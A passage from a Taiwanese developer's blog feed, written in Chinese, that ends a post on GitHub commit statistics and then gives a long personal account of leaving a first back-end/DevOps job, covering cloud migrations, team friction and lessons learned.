&lt;span class="n"&gt;pprint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_stats_desc_sorted&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一樣把程式碼開一個 gist 存：&lt;a href="https://gist.github.com/M157q/94be5759d2f13bfdcdd485feff2be3e6"&gt;https://gist.github.com/M157q/94be5759d2f13bfdcdd485feff2be3e6&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結果&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;GitHub username: M157q  
Target GitHub organization: Tagtoo  
Total contributed repos: 36  
Total commits: 1521  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;總共在 36 個 repos 貢獻了 1521 個 commits，由於大多是 private repo，所以就不一一秀出了。&lt;br /&gt;
這邊只有算在 master branch 上的 commits 而已，不包含 issue 跟 PR。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://hvelarde.blogspot.tw/2014/01/how-to-get-statistics-about-your.html"&gt;hvelarde: How to get statistics about your contributions on a GitHub organization&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="GitHub"></category><category term="Python"></category><category term="Python 3"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>我的新鮮人離職紀錄</title><link href="https://blog.m157q.tw/posts/2017/12/26/i-left-my-first-full-time-job/" rel="alternate"></link><published>2018-01-23T13:48:30+08:00</published><updated>2018-01-23T13:48:30+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-26:posts/2017/12/26/i-left-my-first-full-time-job/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這個標題是為了與另一篇將近兩年前寫的文章：&lt;a href="/posts/2016/02/12/first-job-interviews/"&gt;我的新鮮人面試紀錄&lt;/a&gt; 相互呼應，&lt;br /&gt;
這篇文章因為把面試過程紀錄的很詳細，&lt;br /&gt;
導致被 Google 搜尋到的機率很高，&lt;br /&gt;
意外成了我部落格上瀏覽量最高的文章，&lt;br /&gt;
是當初始料未及的，&lt;br /&gt;
原本只是想紀錄給自己看。  &lt;/p&gt;
&lt;p&gt;至於為什麼這篇文章要與其相呼應的原因也很明顯了，&lt;br /&gt;
嗯，因為我離職了。&lt;br /&gt;
算是這輩子第一份離開的全職工作，&lt;br /&gt;
想說既然當初找工作的時候紀錄得這麼詳細，&lt;br /&gt;
那就不要虎頭蛇尾。&lt;br /&gt;
所以這篇文章會紀錄我在 2016/01/21~2017/11/30 這段時間，&lt;br /&gt;
於塔圖科技擔任 Web back-end engineer 發生的事情。  &lt;/p&gt;
&lt;p&gt;其實 2017/09/30 就辦離職了，&lt;br /&gt;
但 2017/10/01~2017/11/30 轉為約聘，&lt;br /&gt;
把停了一年多的架構搬遷的專案收個尾，&lt;br /&gt;
也算是為自己負責吧。&lt;br /&gt;
而頭銜雖然是掛 Web Back-end Engineer，&lt;br /&gt;
實際上算是 DevOps + Architect + 半個 Support engineer。  &lt;/p&gt;
&lt;p&gt;主要當然還是紀錄下來給我自己以後有空的時候回頭檢視用的，&lt;br /&gt;
但如果有幫助到閱讀這篇文章的你的話，&lt;br /&gt;
我也會感到滿開心的就是，&lt;br /&gt;
如果真的有幫助的話也請你不吝留言讓我知道。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;就先從我做了哪些事開始回想好了，一方面也是為了最近要開始改履歷用。&lt;br /&gt;
這裡當然會比較流水帳一點，會再從這找比較重點的事蹟更新到履歷上。&lt;br /&gt;
以下依照到職時間以每 6 個月來切分：  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;剛到職到六個月&lt;/h3&gt;
&lt;p&gt;因為剛到職的狀況比較多變，所以這裡我再區分成每個月來紀錄：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;剛到職  &lt;ul&gt;
&lt;li&gt;只有我一個 Web Back-end Engineer，另外是寫 JavaScript 的 Support Engineer，也剛進公司沒多久，之前的開發團隊都到另外一間公司去了。  &lt;/li&gt;
&lt;li&gt;雖然在 Slack 上有位前員工可以問，但也只有一開始一兩個月有問而已，其他都靠自己摸索。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;到職一個月  &lt;ul&gt;
&lt;li&gt;把所有前人留下來的文件讀完並進到還有在用的伺服器自行尋找相關設定。  &lt;/li&gt;
&lt;li&gt;因為前人留下來的文件不夠完整，這部份真的很像在打站，拿到一個可以登入的 shell 以後就什麼都要自己找...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;到職兩個月  &lt;ul&gt;
&lt;li&gt;把伺服器搞炸。  &lt;/li&gt;
&lt;li&gt;不小心把 Google Cloud Platform 上的 Compute Engine Service Account 給砍了，到處求助但都無法解決，最後只好開一個新的 GCP Project。  &lt;/li&gt;
&lt;li&gt;因為之前的人把服務都跑在同一台 Google Cloud Compute Engine 上，所以一堆服務都掛掉，為此加班熬夜幾天搞定自己捅出來的簍子。  &lt;/li&gt;
&lt;li&gt;第一次參加 GCPUG.tw 就非常狼狽得來問這個問題，這裡有尋求協助的紀錄：&lt;a href="https://www.facebook.com/groups/GCPUG.TW/permalink/1695449067380624/"&gt;https://www.facebook.com/groups/GCPUG.TW/permalink/1695449067380624/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;剛好公司方向有改變，很多之前的服務用不到，適合開個新的 GCP project 把還有要用的東西移過去。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;到職三個月  &lt;ul&gt;
&lt;li&gt;把雲端平台的使用費省下 70% 左右。  &lt;/li&gt;
&lt;li&gt;大概是從每個月 2x 萬新台幣降到 6 萬左右，大概是降了 20&lt;br /&gt;
萬新台幣左右，雖然嚴格說起來真的沒有很多就是。  &lt;/li&gt;
&lt;li&gt;原因是因為之前團隊的人走了之後，沒把 GCP Cloud Bigtable（可以想成是跑在 GCP 上的 Spark）關掉，也沒在跑啥運算，就這樣每個月白白燒掉 20 萬新台幣。  &lt;/li&gt;
&lt;li&gt;當然也還把一些確定沒用到的服務都一併暫停了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;到職四個月  &lt;ul&gt;
&lt;li&gt;已經把有在跑的服務大致上都搞懂了，可以修改並加上新功能，只剩下一些非常久遠的 legacy package 沒有去動它。  &lt;/li&gt;
&lt;li&gt;開始撰寫新文件，因為對服務都大致瞭解了，所以也從舊的文件中篩選出還有用的部份，將其獨立出來，並儘量完整補充。  &lt;/li&gt;
&lt;li&gt;因為之前的團隊把服務都集中在某台 Google Compute Engine 上，所以開始跟約聘的 Web Back-end Engineer 同事討論計劃把服務拆分出來，以避免之後「一個掛、全部掛」的狀況。  &lt;/li&gt;
&lt;li&gt;剛好同事有用過 Docker 跟 Kubernetes，也是我當時想學的新技術之一，於是就開始計劃把現有的服務都拆分成 microservices。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;到職五個月  &lt;ul&gt;
&lt;li&gt;年資最久的工程師離職了（其實也只比我早進公司 3 個月），所以要花比較多時間帶兩位跟我同期進來，但比較沒經驗的同事。（其實在這之前多少就有花時間帶了，因為座位在旁邊，年紀也相仿，所以比較好溝通。）  &lt;/li&gt;
&lt;li&gt;有新的全職 Web Back-end Engineer 加入，雖然是有經驗的，但也得額外花點時間帶他熟悉。  &lt;/li&gt;
&lt;li&gt;開始針對現有服務的效能做改善。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;到職六個月到一年&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;和後來加入的 Web Back-end Engineer 磨合，年紀差了一輪以上，溝通上面有很嚴重的問題，許多觀念差太多，這是第一個腦海浮現讓我想離職的時候。  &lt;ul&gt;
&lt;li&gt;另外一位年紀與我相仿的約聘同事也在和他的合作上遇到滿大的問題，剛好當時他們有個案子要合作，常常溝通到後來都要請我居中協調。  &lt;/li&gt;
&lt;li&gt;常常在溝通的時候不發表意見，都說「好」「沒問題」，但之後實作出來的程式碼卻不是照討論的結果，而是他原本想做的事，浪費的討論的時間。  &lt;/li&gt;
&lt;li&gt;程式碼會動就好，常常直接 copy-paste 程式碼，因為很快就能交差了事，老闆都會覺得他的進度很快很棒，甚至我包好的 function 也被直接複製出去修改，然後原本的就被棄置。  &lt;/li&gt;
&lt;li&gt;每天都要跑來問我們昨天的進度，但明明大家都會寫在 Trello 上，其實每個人就只是把 Trello 打開，講昨天紀錄的東西，所以是浪費時間，溝通很多次了也沒用，後來就不了了之。  &lt;/li&gt;
&lt;li&gt;所以後來在分配專案的時候，我都會儘量與其避開，因為實在是太累，是心理上的那種累。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;開始把服務拆分並轉移到新的 GCP Project，這中間比較有挑戰性的事情是和另外兩位同事們討論如何做到 zero downtime 的 Database migration，透過架構與程式碼的修改以及撰寫 script 進行資料搬移，大家各負責不同的部份，後來也成功做到了。  &lt;/li&gt;
&lt;li&gt;解決現有服務要提供給中國客戶使用的問題  &lt;ul&gt;
&lt;li&gt;其實這原本不是我主要負責的事，老闆是先指派給年紀比我大一輪的那位同事做，因為他剛好做完了上一件老闆交代的事。我一開始有給些方向與想法，但該同事就沒再來找我討論，結果一個禮拜過去了，上線前測試，根本不會動。跟客戶講說下禮拜就可以好的東西，老闆只好去請客戶寬限一週，然後就落到了我頭上，開啟了一個禮拜的爆炸加班之旅。  &lt;/li&gt;
&lt;li&gt;中國網路環境特殊，要使用 GCP 的服務直接提供根本不可能，因為會被擋光光，但老闆談這筆生意的時候又很急著上線，所以根本來不及把所有的服務都複製到中國的雲端平台上使用，更別說可能還有域名得立案的問題。  &lt;/li&gt;
&lt;li&gt;後來當然是沒有遇域名立案，因為根本沒時間，而是老闆先跟同行借了中國的伺服器，但要佈署服務很麻煩，畢竟不是自己的伺服器，再加上狀況其實不太好，所以最後還是用了中國的雲端服務。  &lt;/li&gt;
&lt;li&gt;加了三天晚上的班，吃老闆請的披薩等等速食晚餐，總算是弄出了個能用的東西。但效果不太好，即便是在中國牆內的網路，還是被擋的很慘，不然就是 latency 太高，而且還被同行合作的程式碼雷到。XD  &lt;/li&gt;
&lt;li&gt;之後大概又來來回回折騰了一個多月，仍舊無法完全克服 Google Tag Manager 部份被擋的狀況。折衷弄了一個全由自己獨立開發的 Django server，撰寫爬蟲定時去抓取資訊，並提供 API，做到確保能載入 &lt;code&gt;gtm.js&lt;/code&gt; 的時候才載入，不能載入的時候就不載入。當然也有把 request 資訊紀錄到資料庫裏面，方便之後拉資料出來觀察狀況。詳細紀錄在這篇文章：&lt;a href="https://blog.m157q.tw/posts/2018/01/11/dealing-with-china-network/"&gt;中國網路相關筆記 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016 梅竹黑客松  &lt;ul&gt;
&lt;li&gt;回交大當評審，其他評審看起來都至少大我 5~10 歲以上，第一次當程式相關的評審，其實有點抖。  &lt;/li&gt;
&lt;li&gt;為此弄了一個 Django server，搭配 Django REST framework 和 Django REST framework Docs 提供 API 給參加者撈出 BigQuery 裡頭的資料。詳細紀錄在這篇文章：&lt;a href="https://blog.m157q.tw/posts/2018/01/07/django-rest-framework-note/"&gt;關於 Django REST framework 的一些筆記 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;開始開發 Facebook Messenger Bot  &lt;ul&gt;
&lt;li&gt;用 Google App Engine 搭配 &lt;code&gt;webapp2&lt;/code&gt; 開發，因為 Facebook 官方沒有 SDK，所以啥都得自己接。  &lt;/li&gt;
&lt;li&gt;也踩到了不少雷，例如：  &lt;ul&gt;
&lt;li&gt;Facebook 的開發文件很雷這應該就不用說了，有程式碼的話直接去看程式碼比較快，程式碼寫的比文件好。  &lt;/li&gt;
&lt;li&gt;Generic Template 10 個 element 都放圖片的話，即便已經用了 cache 快速回應給 Facebook 的伺服器，訊息仍舊非常慢才在 client 端被 render 出來，主要都是卡在圖片。  &lt;/li&gt;
&lt;li&gt;沒有完善的測試環境，基本上大家都是開一個 production bot、一個 testing bot 分開維護。  &lt;/li&gt;
&lt;li&gt;API 常常沒在管 backward compability，major version 都還在 1 的時候常常 API 行為突然就改了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;到職一年到一年半&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;繼續開發 Facebook Messenger Bot  &lt;ul&gt;
&lt;li&gt;2017 上半年時間幾乎都在弄 Facebook Messenger Bot，主要是功能需求其實有點違反 Facebook 的 policy，所以在實作上為了不要觸犯 policy，一直在花時間想要怎麼繞路。  &lt;/li&gt;
&lt;li&gt;主要是需求沒有確定下來，PM 是個初心者，所以浪費了不少時間在做重複的事，導致之後要儲存使用者行為及分析的流程延宕了很久。  &lt;/li&gt;
&lt;li&gt;為了更加瞭解 Facbeook Messenger Bot，2017 年 6 月參加了 &lt;a href="https://fdctaipei.kktix.cc/events/fdc201706"&gt;Facebook Developer Circle: Taipei - Meetup #2&lt;/a&gt;，有篇筆記文：&lt;a href="https://blog.m157q.tw/posts/2017/06/22/facebook-developer-circle-taipei-meetup-2/"&gt;Facebook Developer Circle: Taipei - Meetup #2 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援同事  &lt;ul&gt;
&lt;li&gt;這反而是我這段時間做得比較有成就感的，實在是因為 Messenger Bot 的開發沒規劃好，讓我覺得有點厭煩了。  &lt;/li&gt;
&lt;li&gt;幫忙解決了一些數字落差的問題，有點像是網站方面的 debug，除了更加熟悉架構與細節以外，有時候也挺享受確定問題的發生的原因跟自己思考出來的結果是相同的那種成就感。  &lt;/li&gt;
&lt;li&gt;幫忙把原本在 Travis CI 上要跑一個半小時的測試（沒錯，一個半小時。），加上 multiprocessing，縮短到只要花 15 分鐘就跑完。  &lt;/li&gt;
&lt;li&gt;加上廣告商品自動下架機制，因為原本的下架機制很陽春，常常被客戶抱怨。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;到職一年半到離職前&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;因為覺得公司走向改變，工作內容已經變成我不太喜歡的部份，經過多次思考後，在 2017 的 7 月底提離職。  &lt;ul&gt;
&lt;li&gt;談完之後調整了工作內容，回歸到架構和資料分析的部份。  &lt;/li&gt;
&lt;li&gt;並設定兩個月的觀察期，期間順便把工作相關的部份逐步交接給同事，如果不行的話就 2017 的 9 月底離職。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;開始做 data cleaning 和接觸 Machine Learning  &lt;ul&gt;
&lt;li&gt;參加了幾場資料科學年會辦的活動，學到了不少東西：  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2017/08/12/dive-into-deep-learning-datasci-tw/"&gt;台灣資料科學年會之系列活動：深入淺出深度學習 (Dive into Deep Learning) | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2017/08/13/deep-learning-hands-on-step-by-step-datasci-tw/"&gt;台灣資料科學年會之系列活動：手把手的深度學習實務 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這期間真的是比較多時間在碰 Machine Learing 和 Deep Learning，但花在上面的時間沒有很多，因為還有其他事情得做，而且主要負責機器學習相關專案的開發者不是我，所以自己覺得只學了點皮毛。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;儘量把文件補齊全  &lt;ul&gt;
&lt;li&gt;花最多時間的應該是用 draw.io 畫出了整個公司的伺服器架構圖。  &lt;/li&gt;
&lt;li&gt;其次則是撰寫新的員工訓練與入門文件。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後還是在 2017 的 9 月底離職了，但後續以約聘的方式完成了一件案子，直到 2017 年 11 月底。  &lt;ul&gt;
&lt;li&gt;主要內容是 API 搬遷以及整理資料流。  &lt;/li&gt;
&lt;li&gt;API 搬遷算是 2016 年中做到一半的東西，因為相關人員都已經離職，只剩我比較瞭解，自己也想做個了斷，所以就接了。  &lt;ul&gt;
&lt;li&gt;主要是去除舊的 API 以及增添新的資料庫欄位因應新的需求。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;整理資料流則是儘量讓不同服務之間傳遞資料的方式有個統一的規則，在此之前是有點雜亂無章的，常常會搞混。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;反省&lt;/h2&gt;
&lt;p&gt;「人非聖賢，孰能無過？」其實在這段時間內自己覺得也犯了不少錯，在這邊紀錄下來，用來提醒以後的自己。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;絕對要克制自己看到 legacy code 就想改的強迫症。  &lt;ul&gt;
&lt;li&gt;基本上沒有錯誤或者嚴重效能瓶頸的 legacy code 就別動它了。  &lt;/li&gt;
&lt;li&gt;剛進公司的時候逞一時之勇，改了一些 legacy code 導致行為改變，都是後來有人回報或是察看資料才發現。  &lt;/li&gt;
&lt;li&gt;如果真的要改的話，先確定自己瞭解整個服務在幹嘛，最好還要確定有夠完整的測試，避免修改後出錯卻不知道。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在面對年紀比自己大的同事時的溝通能力還不夠好  &lt;ul&gt;
&lt;li&gt;無法像和年紀相仿的同事那樣直接溝通  &lt;/li&gt;
&lt;li&gt;這部份目前真的沒啥其他想法，之後可能要多注意一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對於技術瞭解得不夠深入  &lt;ul&gt;
&lt;li&gt;很多時候都是網路上查到覺得不錯就用某個工具或方法，但用了以後發現有不少的問題或者中途才發現有更好的處理方法，但要改的話進度又會落後。  &lt;/li&gt;
&lt;li&gt;對於該如何用什麼樣的技術、什麼樣的架構、什麼樣的演算法、什麼樣的資料結構還是不夠確定，資工的基礎部份還是不夠熟，得多花時間加強。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對於專案進度的安排不夠準確  &lt;ul&gt;
&lt;li&gt;常常有進度落後的狀況出現，對於專案的估期還是不夠準確，其實某方面應該也代表自己的技術能力不夠純熟。  &lt;/li&gt;
&lt;li&gt;當然也會遇到需求變動而導致專案進度落後的部份，這部份可能之後要多熟悉 Agile 的流程，畢竟在這份工作並沒有使用到 Agile。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;解釋東西的時候常常會太過發散  &lt;ul&gt;
&lt;li&gt;有時候為了要讓人比較好懂反而會講得太過詳細或太過多餘，甚至不自覺得離了題，這點是自己之後要注意的部份，講話要多講些重點。  &lt;/li&gt;
&lt;li&gt;還有一點要注意的是講解技術相關的東西時，必需要再多加確定聽的人的程度，這樣才能更有效且更精準的討論或解答，不會太過或不及。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;仍舊沒養成寫測試的習慣  &lt;ul&gt;
&lt;li&gt;雖然知道寫測試很重要，但常常因為開發進度的關係來不及寫測試。  &lt;/li&gt;
&lt;li&gt;知道 TDD，但還是不太習慣，總覺得有機會應該找一個 side project，強迫自己試試 TDD，去體會其中明顯的差別。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;英文口說沒太大進步  &lt;ul&gt;
&lt;li&gt;畢竟在台灣能用到的場合相對來說真的比較少，這部份還要自己再找時間精進。  &lt;/li&gt;
&lt;li&gt;基本上現在已經不太怕口說了，但重點是用字會趨於過度單調，常常重複使用同樣的字。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;和人交談技巧還是不夠  &lt;ul&gt;
&lt;li&gt;算是我自己長久以來的問題吧，常常都是事後才想到當時其實應該還有很多東西可以聊，有助於建立人際網路。  &lt;/li&gt;
&lt;li&gt;出社會以後算是真的體驗到人際網路比我以前想像中的重要些。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;聽完演講歸納問題並勇於發問的能力仍舊不足  &lt;ul&gt;
&lt;li&gt;之後應該要多訓練自己聽講時的歸納與分析能力，並和自己的一些想法結合，提出一些精闢的問題。  &lt;/li&gt;
&lt;li&gt;這個算是 2016 年底去 33C3 的時候有非常深刻的體會，會場不僅提問踴躍，每個人問的問題也都很棒，我覺得這是從小到大習慣了填鴨式教育最大的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;時間管理不夠好、自信不足、應該多嘗試面試邀約  &lt;ul&gt;
&lt;li&gt;在這將近兩年的時間內，從 LinkedIn 或 Email 至少收到 7 位獵頭詢問、與一間東南亞頗大間公司的 HR 當面吃飯聊天、和想在加拿大創業的高中同班同學聊過，不過都因為覺得自己還在工作中加上個性的關係沒有進一步去面試，現在覺得導致自己少了滿多學習的機會的。  &lt;/li&gt;
&lt;li&gt;之後在工作中如果有不錯的面試邀約應該就會去嘗試看看，不然老實說將近兩年的時間沒有面試，對於面試的東西實在有點生疏，現在要額外準備的心力讓我的拖延症更嚴重了。以後不如就把面試當健身，讓自己保持在習慣面試的狀態，也許這樣會比較好。  &lt;/li&gt;
&lt;li&gt;期間還有一件事是，2015 年底找工作的時候在 Livecoding.tv 這個平台（現在改名為 LiveEdu）上開了寫程式的實況，後來找到工作後因為租屋觸網路問題所以就沒繼續開了，結果後來發生了幾件事：  &lt;/li&gt;
&lt;li&gt;收到不少次該平台的工作人員寄訊息來說覺得我的實況不錯，不知道為什麼我沒繼續開了，想邀請我參加他們的 Premium member，可能每週固定時間開實況這樣。  &lt;/li&gt;
&lt;li&gt;也在該平台的私訊收到一些人表示剛學 Python，說看我之前的實況 VOD 學到不少，算是在這平台上還不錯的影片，問我什麼時候能繼續開。  &lt;ul&gt;
&lt;li&gt;當時我因為 2016 年下半年比較忙，再加上租屋處網路問題短時間內也無法解決，所以只回說目前因為網路問題無法解決所以不會開，之後有可能會再開，但不一定。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;收到該平台中國區工作人員邀請我進行一段訪問，我也因為工作因素加上自信不足沒有回應，就這樣算是錯失了一個可以小小建立一點自己的能見度的機會。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;在這將近兩年的工作時間，收穫其實也不少，就在這邊把一些心得感想寫下來。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最大的收穫應該是認識了一群感情很好的同事吧  &lt;ul&gt;
&lt;li&gt;週末晚上會約去唱歌、吃飯、喝酒，還有自己揪團的小旅行。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用中文和技術職或非技術職的同事溝通的能力算是有長進吧  &lt;ul&gt;
&lt;li&gt;獲得了「會講人話的工程師」的稱號  &lt;/li&gt;
&lt;li&gt;關於回答問題的部份，最近翻譯的這篇文章算是把我想講的話都講出來了：&lt;a href="https://blog.m157q.tw/posts/2017/12/21/how-to-answer-questions-in-a-helpful-way-zh-tw/"&gt;《回答的智慧》 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Docker 和 Kubernetes 算是這份工作學到比較多的吧  &lt;ul&gt;
&lt;li&gt;雖然自己覺得對於 Docker 和 Kubernetes 的實作還是不夠瞭解，如果要進行效能方面的改善的話應該還是會有問題就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;獨立完成的兩個使用 Django 的專案  &lt;ul&gt;
&lt;li&gt;無論是程式碼、註解、說明文件，我自己都覺得還算滿意。  &lt;/li&gt;
&lt;li&gt;最不滿意的都是效能的部份，之後從事 Python 相關開發的話得提醒自己多注重要怎麼讓效能更好這一部份。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;算是有點確定自己有興趣的方向了  &lt;/li&gt;
&lt;li&gt;對於網站後端架構以及自動化測試與佈署的部份，覺得能幫助同事和自己節省更多時間或看到因為架構改善讓開發變得比較容易，會滿有成就感的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;原因&lt;/h2&gt;
&lt;p&gt;紀錄一下這次離職的一些原因，想說在之後有新工作的時後可以拿來檢視。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;公司著重方向改變，和我想做的事情以及當初面試進來的工作內容不符合。  &lt;ul&gt;
&lt;li&gt;主要是我對於新的方向沒有很強烈的興趣。  &lt;/li&gt;
&lt;li&gt;雖然工作內容有調整，但剛進來的新人也無法成為即戰力，等於是我要做更多的事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;覺得自己的技術能力沒有什麼顯著的長進  &lt;ul&gt;
&lt;li&gt;自己覺得剛畢業後的工作應該要能夠讓自己的技術能力有顯著的成長，不然會嚴重影響之後的職涯發展  &lt;/li&gt;
&lt;li&gt;因為同事大部份都算是初學者，所以花比較多時間在帶人，基本上同事有問問題的話我都是儘量回答到好，畢竟從別人的問題也常常可以學到新東西或發現自己的盲點。  &lt;/li&gt;
&lt;li&gt;甚至連非工程師的同事提出的問題我也儘量回答，而且是儘我最大的能力用比喻的方式讓不懂技術名詞的同事也能理解其中的概念。  &lt;/li&gt;
&lt;li&gt;其實我還滿享受這種幫助同事的成就感，但肯定是會擠壓到我精進技術能力的時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;薪資成長不如預期  &lt;ul&gt;
&lt;li&gt;覺得調薪幅度跟我做的事情不太成比例。  &lt;/li&gt;
&lt;li&gt;當然也可能跟我自己沒有積極爭取加薪有關，算是下一份工作會想要有所突破的部份吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;其實在這將近兩年的工作時間內，我也有好幾次不斷問自己，「到底下一份工作要不要找個大公司試試？」每次問完自己以後，都還是偏向找比較小型的公司。  &lt;/p&gt;
&lt;p&gt;最近再次問了自己這個問題，還是想要找小型的新創公司來待，可能跟我自己的個性有關吧，不是很在意 brand name。  &lt;/p&gt;
&lt;p&gt;但我想之後還是會每隔一段時間問自己這個問題就是，我自己也知道大公司與小公司各有優缺點，唯一一個讓我覺得最有感的是，大公司比較有可能遇到好的 mentor 授予你一些經驗，不是說小公司遇不到，主要是小公司每個人得各司其職，工作範圍可能都不太重疊，所以比較沒有人有時間可以帶你。大公司則制度比較完善，人力資源也比較多，也大多會分配 mentor，當然能不能遇到好 mentor 也是要看運氣就是。  &lt;/p&gt;
&lt;p&gt;這份工作會想離職有滿大一部份原因是「沒有人可以帶我」，所以都得靠自己摸索，也不是說自己就無法自學，只是就進步得比較緩慢，然後就覺得自己將近兩年來在能力上沒啥成長。也許跟之前的工作都有比我有經驗的人在帶有關，被有經驗的人指點或者被有經驗的人電，會讓我學得非常快，我想這是我自己的盲點，需要多花點時間去思考。  &lt;/p&gt;
&lt;p&gt;下一份工作應該會先從國外的小型新創公司開始找吧，如果能夠 relocate 的話最好，但目前並沒有鎖定美國，畢竟美國現在因為 Trump 當總統，所以對技術移民不是那麼友善。  &lt;/p&gt;
&lt;p&gt;但也有在考慮大公司就是，主要是可以面對規模比較大的服務以及可以接觸到比較深的技術，這是主要考量的點，很多問題在規模夠大的服務才會浮現，而且通常滿有挑戰性的。畢竟小公司大多數狀況會因為人少而且要急著有個賺錢的產品，所以會比較偏快速弄出個應用，且剛上線的服務使用人數不會太多。總之最近跟朋友聊完以後，對大公司可能有這樣的工作環境有點興趣，但就是要多花更多心力去準備大公司繁瑣的面試流程就是。  &lt;/p&gt;
&lt;p&gt;我反而比較想去比較少人去的歐洲或是紐澳，總之可能就是邊緣人個性作祟吧，想去試一些比較少人試過的事。也因為這樣，其實雖然知道 referral 是比較容易找到工作的，但我其實沒有很喜歡從朋友變成同事，不知道為什麼下意識就會覺得多了一份利害關係而感到尷尬，還是覺得朋友之間可以分享彼此都不知道的事情比較有趣些。  &lt;/p&gt;
&lt;p&gt;但我可以接受從同事變成朋友，我也不太確定為啥我會有這種想法，可能是因為我對朋友的要求並沒有很嚴格，就算我不太喜歡某位朋友的作風，我還是可以接受他比較 OK 的地方，但如果要成為同事的話，可能就會超越這條線讓我無法接受吧。再加上我的個性很難與人深交，所以寧願多認識一些不同的人之類的。  &lt;/p&gt;
